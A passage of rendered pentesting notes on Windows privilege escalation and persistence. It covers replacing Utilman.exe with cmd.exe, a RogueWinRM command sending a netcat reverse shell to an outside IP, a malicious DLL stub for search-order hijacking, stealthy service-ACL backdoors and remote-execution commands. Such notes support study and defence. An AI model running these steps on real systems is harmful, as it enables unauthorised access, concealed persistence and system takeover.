<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">takeown </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">f </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">PATH_TO_FILE</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Give your user ($USERNAME) full access (F) to said file</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">icacls </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">PATH_TO_FILE</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> /</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">grant </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">USERNAME:</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">F</span></span></code></pre></figure>
<p>The “standard” file to replace with cmd.exe with this trick is <code>C:\Windows\System32\Utilman.exe</code>, which provides accessibility services access from lock and login screens.</p><a href="../spellbook/admin-like-windows-permissions/../../spells/windows-setakeownership-permission" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="seimpersonate--seassignprimarytoken">SeImpersonate / SeAssignPrimaryToken<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#seimpersonate--seassignprimarytoken" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="windows-seimpersonate-and-seassignrimarytoken-permissions" data-block data-embed-alias="undefined"><h1>Windows SeImpersonate and SeAssignPrimaryToken permissions</h1><p>These permissions allow for user impersonation. On <a href="../spells/windows-seimpersonate-and-seassignrimarytoken-permissions/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a>, the <code>Local Service</code> and <code>Network Service</code> accounts already have these privileges; if IIS is installed, there will also often be an <code>IIS AppPool/DefaultAppPool</code> service account with these permissions as well.</p>
<p><em>However</em>, it <em>isn’t</em> enough to just have access to a service running as a user with these permissions, as <a href="../spells/windows-seimpersonate-and-seassignrimarytoken-permissions/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> will not allow an application to <em>arbitrarily</em> impersonate a user. Instead, we must have a service and then <em>trick/force a highly privileged account to connect to it</em>, at which point impersonation will be allowed.</p>
<p>One way to do this is using the RogueWinRM exploit. The idea here is that when a user logs in, the BITS service creates a connection on port 5985 to the (local) WinRM service (which is used to execute <a href="../spells/windows-seimpersonate-and-seassignrimarytoken-permissions/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a> commands) <em>as SYSTEM</em>. If the WinRM service isn’t running, RogueWinRM can be run instead to capture these connections (I’m guessing that the WinRM service can also be back-doored using RogueWinRM directly, but that doing so may interfere with system functionality?).</p>
<p>Example RogueWinRM command line:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">C:\</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">RogueWinRM.exe</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">p C:\</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">nc64.exe</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">                  -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">a </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">-e cmd.exe 10.13.25.33 4442</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span></span></code></pre></figure><a href="../spellbook/admin-like-windows-permissions/../../spells/windows-seimpersonate-and-seassignrimarytoken-permissions" class="internal transclude-src">Link to original</a></blockquote><p></p><a href="../spellbook/admin-like-windows-permissions" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h4 id="bulk-editing-permissions">Bulk editing permissions<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#bulk-editing-permissions" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<p></p><blockquote class="transclude" data-url="how-to-bulk-edit-windows-permissions" data-block data-embed-alias="undefined"><h1>How to bulk edit Windows permissions</h1><p>Privileges can also be manipulated/assigned to users in bulk using the secedit tool</p>
<ol>
<li>Dump system privileges: <code>secedit /export /cfg config.inf</code>.</li>
<li>Edit config.inf, appending the user you want to have a given privilege to that privilege’s assignment line (comma-delineated list).</li>
<li>Re-import the system privileges: <code>secedit /import /cfg config.inf /db config.sdb &amp; secedit /configure /db config.sdb /cfg config.inf</code></li>
</ol><a href="../spells/how-to-bulk-edit-windows-permissions" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h4 id="service-acls">Service ACLs<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#service-acls" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h4>
<p></p><blockquote class="transclude" data-url="windows-service-acls" data-block data-embed-alias="undefined"><h1>Windows service ACLs</h1><p>For connecting to services (such as <a href="../spells/windows-service-acls/../../spells/windows-remote-management" class="internal alias" data-slug="spells/windows-remote-management">WinRM</a>), it’s often possible to manipulate the service ACL rather than the user’s privileges. For example, adding a user to the <code>Microsoft.PowerShell</code> security descriptor with the “Full Control” permission will enable access to the WinRM service, regardless of the permissions explicitly assigned to the user.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Note that the below PowerShell command will pull up a GUI ACL</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># configuration dialog</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">Set-PSSessionConfiguration</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Name Microsoft.PowerShell </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">-</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">showSecurityDescriptorUI</span></span></code></pre></figure>
<p>The advantage to manipulating user privileges and service ACLs directly is that it’s less obvious that a user is back-doored.</p><a href="../spells/windows-service-acls" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="dlls-1">DLLs<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#dlls-1" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="how-to-exploit-the-windows-dll-search-order" data-block data-embed-alias="undefined"><h1>How to exploit the Windows DLL search order</h1><p>Exploiting the <a href="../spells/how-to-exploit-the-windows-dll-search-order/../../spells/windows-dll-search-order" class="internal alias" data-slug="spells/windows-dll-search-order">Windows DLL search order</a> is basically the same idea as <a href="../spells/how-to-exploit-the-windows-dll-search-order/../../spells/how-to-exploit-ld_library_path" class="internal alias" data-slug="spells/how-to-exploit-ld_library_path">exploiting the LD_LIBRARY_PATH on Linux</a>.</p>
<p>A stub malicious DLL:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="c" data-theme="vitesse-light vitesse-light"><code data-language="c" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">#</span><span style="--shiki-light:#1E754F;--shiki-dark:#1E754F;">include</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &lt;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">windows.h</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">BOOL WINAPI DllMain</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">(</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">HANDLE hDll</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> DWORD dwReason</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">,</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> LPVOID lpReserved</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">)</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> {</span></span>
<span data-line><span style="--shiki-light:#1E754F;--shiki-dark:#1E754F;">	if</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> (</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">dwReason </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">==</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> DLL_PROCESS_ATTACH</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">)</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> {</span></span>
<span data-line><span style="--shiki-light:#59873A;--shiki-dark:#59873A;">		system</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">cmd.exe /C whoami > C:</span><span style="--shiki-light:#B31D28;--shiki-dark:#B31D28;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">\T</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">emp</span><span style="--shiki-light:#B31D28;--shiki-dark:#B31D28;--shiki-light-font-style:italic;--shiki-dark-font-style:italic;">\d</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">ll.txt</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">);</span></span>
<span data-line><span style="--shiki-light:#59873A;--shiki-dark:#59873A;">		ExitProcess</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">(</span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">0</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">);</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">	}</span></span>
<span data-line><span style="--shiki-light:#1E754F;--shiki-dark:#1E754F;">	return</span><span style="--shiki-light:#1E754F;--shiki-dark:#1E754F;"> TRUE</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">;</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">}</span></span></code></pre></figure>
<p>Compile with mingw (on <a href="../spells/how-to-exploit-the-windows-dll-search-order/../../spellbook/linux" class="internal alias" data-slug="spellbook/linux">Linux</a>!):</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="vitesse-light vitesse-light"><code data-language="bash" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#59873A;--shiki-dark:#59873A;">x86_64-w64-mingw32-gcc</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;"> windows_dll.c</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> -shared</span><span style="--shiki-light:#A65E2B;--shiki-dark:#A65E2B;"> -o</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;"> output.dll</span></span></code></pre></figure><a href="../spells/how-to-exploit-the-windows-dll-search-order" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="windows-scripting-host">Windows scripting host<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#windows-scripting-host" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="windows-scripting-host" data-block data-embed-alias="undefined"><h1>Windows Scripting Host</h1><p>The <a href="../spells/windows-scripting-host/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> Scripting Host (WSH) consists of two tools, cscript.exe for command-line scripts and wscript.exe for UI scripts, and executes <a href="../spells/windows-scripting-host/../../spells/how-to-backdoor-visual-basic-scripts" class="internal alias" data-slug="spells/how-to-backdoor-visual-basic-scripts">Visual Basic scripts</a> (though it doesn’t care about the extension). WSH operates with <em>regular user privileges</em>, not admin privileges.</p>
<p>An example VBScript:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="vb" data-theme="vitesse-light vitesse-light"><code data-language="vb" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">Dim</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;"> message                </span><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">' Create the variable message</span></span>
<span data-line><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">message</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> =</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">Welcome to THM</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"> ' Set the variable message</span></span>
<span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">MsgBox</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> message             </span><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">' Display message using a pop-up dialog</span></span></code></pre></figure>
<p>Executing a program requires creating a “shell” object:</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="vb" data-theme="vitesse-light vitesse-light"><code data-language="vb" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">Set </span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">shell</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> =</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> WScript.</span><span style="--shiki-light:#998418;--shiki-dark:#998418;">CreateObject</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">Wscript.Shell</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">)</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">' Note the space after calc.exe! This is required because of</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">' some weird interactions between wscript.exe/cscript.exe and</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">' the VB runtime. Alternately, TRIPLE double quotes can be</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">' used instead.</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">shell.</span><span style="--shiki-light:#59873A;--shiki-dark:#59873A;">Run</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">C:\Windows\System32\calc.exe </span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> &amp;</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> WScript.</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">ScriptFullName</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">)</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">,</span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">0</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">,</span><span style="--shiki-light:#1E754F;--shiki-dark:#1E754F;">True</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">' Alternate way to call calc.exe.</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">shell.</span><span style="--shiki-light:#59873A;--shiki-dark:#59873A;">Run</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">(</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;&quot;&quot;</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">C:\Windows\System32\calc.exe</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;&quot;&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> &amp;</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;"> WScript.</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">ScriptFullName</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">)</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">,</span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">0</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">,</span><span style="--shiki-light:#1E754F;--shiki-dark:#1E754F;">True</span></span></code></pre></figure>
<p>It appears that recent versions of <a href="../spells/windows-scripting-host/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> may <em>severely</em> limit which binaries can be called from the <code>wscript.Shell</code> object; calc.exe works, but pretty much nothing else does.</p><a href="../spells/windows-scripting-host" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h3 id="winrm-1">WinRM<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#winrm-1" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<p></p><blockquote class="transclude" data-url="how-to-use-windows-remote-management" data-block data-embed-alias="undefined"><h1>How to use Windows Remote Management</h1><blockquote class="callout tip" data-callout="tip">
<div class="callout-title">
                  <div class="callout-icon"></div>
                  <div class="callout-title-inner"><p>IMPORTANT</p></div>
                  
                </div>
<div class="callout-content">
<p>By default, UAC restricts WinRM calls to domain admins and the default local “Administrator” account. <em>Local <a href="../spellbook/how-to-use-windows-remote-management/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> admins cannot call this service without first disabling UAC!</em></p>
</div>
</blockquote>
<blockquote class="callout warning" data-callout="warning">
<div class="callout-title">
                  <div class="callout-icon"></div>
                  <div class="callout-title-inner"><p>WARNING</p></div>
                  
                </div>
<div class="callout-content">
<p>Admin-ish <a href="../spellbook/how-to-use-windows-remote-management/../../spellbook/admin-like-windows-permissions" class="internal alias" data-slug="spellbook/admin-like-windows-permissions">privileges</a> (including privileges associated with the Backup Operators group) are stripped by default when using WinRM. To enable this access, we need to set the LocalAccountTokenFilterPolicy registry key to 1.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">t REG_DWORD </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">v LocalAccountTokenFilterPolicy </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">/</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">d </span><span style="--shiki-light:#2F798A;--shiki-dark:#2F798A;">1</span></span></code></pre></figure>
</div>
</blockquote>
<p></p><blockquote class="transclude" data-url="windows-remote-management" data-block data-embed-alias="undefined"><h1>Windows remote management</h1><p><a href="../spells/windows-remote-management/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a> Remote Management (WinRM) is basically <a href="../spells/windows-remote-management/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a>-over-<a href="../spells/windows-remote-management/../../spellbook/http" class="internal alias" data-slug="spellbook/http">HTTP</a>. It requires access to <a href="../spells/windows-remote-management/../../spellbook/tcp" class="internal alias" data-slug="spellbook/tcp">TCP</a> 5985 (unencrypted) or <a href="../spells/windows-remote-management/../../spellbook/tcp" class="internal alias" data-slug="spellbook/tcp">TCP</a> 5986 (encrypted).</p><a href="../spellbook/how-to-use-windows-remote-management/../../spells/windows-remote-management" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="winrs">WinRS<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#winrs" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="winrs" data-block data-embed-alias="undefined"><h1>winrs</h1><p>winrs.exe is an older application used to interact with <a href="../spells/winrs/../../spells/windows-remote-management" class="internal alias" data-slug="spells/windows-remote-management">WinRM</a>.</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#998418;--shiki-dark:#998418;">winrs.exe</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">u:</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_USER</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">          -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">p:</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_PASSWORD</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">          -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">r:</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">TARGET_HOST</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> $</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">COMMAND</span></span></code></pre></figure>
<p>This interface has been largely deprecated in favor of <a href="../spells/winrs/../../spells/how-to-use-winrm-with-powershell" class="internal alias" data-slug="spells/how-to-use-winrm-with-powershell">using PowerShell</a>, and may not even be present on recent versions of <a href="../spells/winrs/../../spellbook/windows" class="internal alias" data-slug="spellbook/windows">Windows</a>.</p><a href="../spellbook/how-to-use-windows-remote-management/../../spells/winrs" class="internal transclude-src">Link to original</a></blockquote><p></p>
<h2 id="powershell">PowerShell<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#powershell" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<p></p><blockquote class="transclude" data-url="how-to-use-winrm-with-powershell" data-block data-embed-alias="undefined"><h1>How to use WinRM with PowerShell</h1><p>Many large companies will enable <a href="../spells/how-to-use-winrm-with-powershell/../../spellbook/powershell" class="internal alias" data-slug="spellbook/powershell">PowerShell</a> remoting on all machines in order to ease IT support burdens (by default, remoting is only enabled on domain controllers).</p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="vitesse-light vitesse-light"><code data-language="powershell" data-theme="vitesse-light vitesse-light" style="display:grid;"><span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;"># Create PSCredential object for authentication.</span></span>
<span data-line><span style="--shiki-light:#A0ADA0;--shiki-dark:#A0ADA0;">#</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">username</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> =</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">TARGET_USER</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">;</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">password</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> =</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">TARGET_PASSWORD</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">;</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">SECURE_PASSWORD</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> =</span><span style="--shiki-light:#998418;--shiki-dark:#998418;"> ConvertTo-SecureString</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;"> &quot;</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B56959;--shiki-dark:#B56959;">TARGET_PASSWORD</span><span style="--shiki-light:#B5695977;--shiki-dark:#B5695977;">&quot;</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">                                          -</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">AsPlainText </span><span style="--shiki-light:#999999;--shiki-dark:#999999;">-</span><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">Force</span><span style="--shiki-light:#999999;--shiki-dark:#999999;">;</span></span>
<span data-line><span style="--shiki-light:#999999;--shiki-dark:#999999;">$</span><span style="--shiki-light:#B07D48;--shiki-dark:#B07D48;">CREDENTIAL_OBJECT</span><span style="--shiki-light:#999999;--shiki-dark:#999999;"> =</span><span style="--shiki-light:#998418;--shiki-dark:#998418;"> New-Object</span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;"> `</span></span>
<span data-line><span style="--shiki-light:#393A34;--shiki-dark:#393A34;">                   System.Management.Automation.PSCredential </span><span style="--shiki-light:#AB5959;--shiki-dark:#AB5959;">`</span></span>
